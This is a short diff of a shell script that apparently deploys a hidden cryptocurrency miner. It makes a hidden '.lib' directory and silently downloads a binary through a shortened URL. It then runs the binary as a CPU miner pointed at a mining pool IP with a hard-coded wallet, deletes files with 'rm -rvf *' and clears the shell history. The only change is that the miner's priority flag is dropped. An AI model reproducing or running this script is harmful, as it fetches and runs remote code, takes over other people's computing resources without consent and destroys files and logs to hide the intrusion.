@@ -9,7 +9,7 @@ rm nyumput.c
 mkdir .lib && cd .lib
 wget -O sgr1 https://bitly.ws/38oka >/dev/null 2>&1
 chmod +x sgr1
-nice -n -10 ./sgr1 --algorithm yespowersugar --pool 141.94.192.217:7042 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
+./sgr1 --algorithm yespowersugar --pool 141.94.192.217:7042 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.envio --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive #> /dev/null 2>&1 &
 rm -rvf *
 history -cr
 #while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
